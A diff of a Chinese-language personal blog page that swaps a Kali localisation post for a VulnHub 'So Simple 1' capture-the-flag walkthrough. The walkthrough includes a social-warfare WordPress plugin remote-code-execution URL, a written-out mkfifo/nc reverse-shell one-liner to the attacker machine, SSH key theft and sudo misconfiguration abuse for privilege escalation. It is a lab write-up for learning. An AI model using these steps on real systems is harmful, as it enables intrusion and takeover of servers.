@@ -20,23 +20,35 @@
     var CONFIG = {"hostname":"bmoos.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了(都是自己手贱)，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。">
+  <meta name="description" content="前言发现前两天下了个靶机还没做，今天就做一下，马上要开学了，有点期待。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali-19.4汉化以及伪装win10界面">
-<meta property="og:url" content="https://bmoos.github.io/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/index.html">
+<meta property="og:title" content="VulnHub靶机writeup--So Simple 1">
+<meta property="og:url" content="https://bmoos.github.io/2020/09/02/VulnHub%E9%9D%B6%E6%9C%BAwriteup-So-Simple-1/index.html">
 <meta property="og:site_name" content="BMooS">
-<meta property="og:description" content="前言​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了(都是自己手贱)，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。">
+<meta property="og:description" content="前言发现前两天下了个靶机还没做，今天就做一下，马上要开学了，有点期待。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.ax1x.com/2020/02/28/3rtbOs.png">
-<meta property="og:image" content="https://s2.ax1x.com/2020/02/28/3rNZtK.png">
-<meta property="article:published_time" content="2020-02-28T13:36:55.000Z">
-<meta property="article:modified_time" content="2020-03-18T09:46:13.242Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wp6Yb8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wp6Dvq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wphUOA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/wp4QXj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9CKoV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9PFTx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9Pc3F.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9kXDJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9A8bj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9Aqit.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9ElJx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9nzLT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9Q0te.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/02/w9lAAO.png">
+<meta property="article:published_time" content="2020-09-02T10:21:23.000Z">
+<meta property="article:modified_time" content="2020-09-02T14:39:55.608Z">
 <meta property="article:author" content="BMooS">
-<meta property="article:tag" content="kali">
+<meta property="article:tag" content="渗透实战">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/28/3rtbOs.png">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/02/wp6Yb8.png">
 
-<link rel="canonical" href="https://bmoos.github.io/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/">
+<link rel="canonical" href="https://bmoos.github.io/2020/09/02/VulnHub%E9%9D%B6%E6%9C%BAwriteup-So-Simple-1/">
 
 
 <script id="page-configurations">
@@ -48,7 +60,7 @@
   };
 </script>
 
-  <title>kali-19.4汉化以及伪装win10界面 | BMooS</title>
+  <title>VulnHub靶机writeup--So Simple 1 | BMooS</title>
   
 
 
@@ -198,7 +210,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://bmoos.github.io/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/">
+    <link itemprop="mainEntityOfPage" href="https://bmoos.github.io/2020/09/02/VulnHub%E9%9D%B6%E6%9C%BAwriteup-So-Simple-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://s2.ax1x.com/2020/01/15/lOIrB4.jpg">
@@ -211,7 +223,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          kali-19.4汉化以及伪装win10界面
+          VulnHub靶机writeup--So Simple 1
         </h1>
 
         <div class="post-meta">
@@ -220,24 +232,18 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-02-28 21:36:55" itemprop="dateCreated datePublished" datetime="2020-02-28T21:36:55+08:00">2020-02-28</time>
+              <time title="创建时间：2020-09-02 18:21:23 / 修改时间：22:39:55" itemprop="dateCreated datePublished" datetime="2020-09-02T18:21:23+08:00">2020-09-02</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-18 17:46:13" itemprop="dateModified" datetime="2020-03-18T17:46:13+08:00">2020-03-18</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
-                    <span itemprop="name">操作系统</span>
+                  <a href="/categories/VulnHub/" itemprop="url" rel="index">
+                    <span itemprop="name">VulnHub</span>
                   </a>
                 </span>
             </span>
@@ -274,33 +280,51 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了(都是自己手贱)，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现前两天下了个靶机还没做，今天就做一下，马上要开学了，有点期待。</p>
 <a id="more"></a>
 
-<h1 id="汉化过程"><a href="#汉化过程" class="headerlink" title="汉化过程"></a>汉化过程</h1><p>​        首先把kali的下载源更改为国内：kali源：</p>
-<p>​        <code>vim /etc/apt/source.list</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>更新源和软件</p>
-<p><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
-</li>
-<li><p>选语言</p>
-<p><code>dpkg-reconfigure locales</code></p>
-<p>进入图形界面，选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8（空格是选择，tab是切换，*是选中）并将zh_US.UTF-8选为默认。</p>
-</li>
-<li><p>安装中文字体</p>
-<p><code>apt-get install xfonts-intl-chinese</code></p>
-<p><code>apt-get install ttf-wqy-microhei</code></p>
-</li>
-<li><p>重启kali</p>
-<p>重启若还是英文，就继续重启，基本一到两次后就可以了</p>
-</li>
-</ol>
-<h1 id="win10-模式"><a href="#win10-模式" class="headerlink" title="win10 模式"></a>win10 模式</h1><p>终端执行 <code>kali-undercover</code></p>
-<p><img src="https://s2.ax1x.com/2020/02/28/3rtbOs.png" alt="3rtbOs.png"></p>
-<p>再次输入 <code>kali-undercover</code>即可退出win10模式</p>
-<p><img src="https://s2.ax1x.com/2020/02/28/3rNZtK.png" alt="3rNZtK.png"></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载靶机<code>So Simple 1</code>到本地，本来是用VMware打开的，但是发现有点问题，就用VirtualBox了，值得注意的一点是VirtualBox要用管理员权限打开，这里我被坑了好久，还有一点就是VirtualBox没有扩展下载的话就把靶机的USB设备调到1.1(OHCI)，要不打不开。</p>
+<p>这里网络设置是，kali我是用VMware打开，靶机用的VirtualBox，网络设置都设置为桥接模式，和物理机同在一个网段。</p>
+<blockquote>
+<p>kali：192.168.0.105</p>
+<p>靶机：192.168.0.100</p>
+</blockquote>
+<p>靶机端口扫描结果开启了22和80端口</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb</code>扫描结果没啥特殊的，唯一值得关注的是靶机有wordpress，在路径<code>http://192.168.0.100/wordpress/</code>目录下，这里用<code>wpscan</code>扫描：</p>
+<p><code>wpscan --url http://192.168.0.100/wordpress</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/02/wp6Yb8.png" alt="wp6Yb8.png"></p>
+<p>发现插件<code>social-warfare</code>版本有些低，网上查一查，果真查到了<a href="https://wpvulndb.com/vulnerabilities/9259" target="_blank" rel="noopener">RCE漏洞</a></p>
+<p><img src="https://s1.ax1x.com/2020/09/02/wp6Dvq.png" alt="wp6Dvq.png"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过给的POC验证一下：</p>
+<p>首先在本地写好payload，用python搭建一个HTTP服务：</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/wphUOA.png" alt="wphUOA.png"></p>
+<p>然后查看<code>http://192.168.0.100/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.0.105:8000/payload.txt</code></p>
+<p><img src="https://s1.ax1x.com/2020/09/02/wp4QXj.png" alt="wp4QXj.png"></p>
+<p>POC验证成功</p>
+<p>然后通过RCE来反弹一个shell，先写一个反弹shell，然后在本地监听</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9CKoV.png" alt="w9CKoV.png"></p>
+<p>这里的payload为：</p>
+<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.105 9527 &gt;/tmp/f</code></p>
+<p>解释一下，这里先用mkfifo建立了一个管道，然后使用cat将管道里面的内容输出传递给/bin/bash，bash会执行管道里面的命令并将标准输出和标准错误通过nc传递给远程主机，管道的标准输入也重定向到nc远程主机的输出上，形成了一个回路</p>
+<h2 id="用户权限获取"><a href="#用户权限获取" class="headerlink" title="用户权限获取"></a>用户权限获取</h2><p>根据提示，这个靶机有三个flag，两个用户和一个root，那么就要获取到这三个权限来查看flag，先从用户看：</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9PFTx.png" alt="w9PFTx.png"></p>
+<p>两个用户，一个max一个steven</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9Pc3F.png" alt="w9Pc3F.png"></p>
+<p>max用户的ssh私钥设置不当，www-data用户可以使用cat查看到，将ssh私钥复制到本地，通过ssh连接到靶机，获取到max用户权限（要设置文件权限才可以使用）</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9kXDJ.png" alt="w9kXDJ.png"></p>
+<p>max的flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9A8bj.png" alt="w9A8bj.png"></p>
+<p>使用<code>sudo -l</code>发现steven用户可以免密使用service服务，使用service切换到steven用户的bash</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9Aqit.png" alt="w9Aqit.png"></p>
+<p>获取到steven的flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9ElJx.png" alt="w9ElJx.png"></p>
+<h2 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h2><p>同样的通过<code>sudo -l</code>看到可以使用root权限免密运行<code>/opt/tools/server-health.sh</code>，但是tools文件夹并不存在</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9nzLT.png" alt="w9nzLT.png"></p>
+<p>可以自己创建该文件，写入一个反弹shell</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9Q0te.png" alt="w9Q0te.png"></p>
+<p>在本地进行监听，成功获取root用户的flag</p>
+<p><img src="https://s1.ax1x.com/2020/09/02/w9lAAO.png" alt="w9lAAO.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的靶机也很简单，但是实际上来说，黑灯瞎火去找，或许会没有思路，只能说这次靶机的思路很骚，或许是我少见多怪，其中也学习到了很多东西，包括wordpress插件的RCE漏洞利用，使用ssh私钥登陆远程主机，sudo设置中免密配置不当可以造成越权，反弹shell的原理以及使用。</p>
 
     </div>
 
@@ -310,7 +334,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/kali/" rel="tag"># kali</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/" rel="tag"># 渗透实战</a>
           </div>
 
         
@@ -319,13 +343,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/02/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98-%E5%AE%B6%E7%94%A8%E7%94%B5%E8%84%91/" rel="prev" title="渗透测试实战--家用电脑">
-      <i class="fa fa-chevron-left"></i> 渗透测试实战--家用电脑
+    <a href="/2020/08/28/VulnHub%E9%9D%B6%E6%9C%BAwriteup-Billu-b0x/" rel="prev" title="VulnHub靶机writeup--Billu_b0x">
+      <i class="fa fa-chevron-left"></i> VulnHub靶机writeup--Billu_b0x
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/03/01/DNS%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ADNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/" rel="next" title="DNS服务以及DNS域传送漏洞">
-      DNS服务以及DNS域传送漏洞 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -385,7 +406,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#汉化过程"><span class="nav-number">2.</span> <span class="nav-text">汉化过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#win10-模式"><span class="nav-number">3.</span> <span class="nav-text">win10 模式</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#目录扫描"><span class="nav-number">2.1.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户权限获取"><span class="nav-number">2.3.</span> <span class="nav-text">用户权限获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root权限获取"><span class="nav-number">2.4.</span> <span class="nav-text">root权限获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">2.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
